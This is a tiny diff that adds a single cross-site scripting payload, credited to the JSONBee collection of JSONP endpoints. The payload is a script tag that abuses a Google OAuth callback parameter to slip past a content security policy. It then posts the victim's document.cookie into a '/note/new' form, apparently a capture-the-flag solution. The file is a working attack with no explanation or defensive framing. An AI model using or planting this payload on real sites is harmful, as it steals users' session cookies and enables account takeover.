@@ -1,0 +1,3 @@
+# URL from https://github.com/zigoo0/JSONBee
+
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=$.post('/note/new', {title:'I Win', content: document.cookie, submit:'save'})"></script>
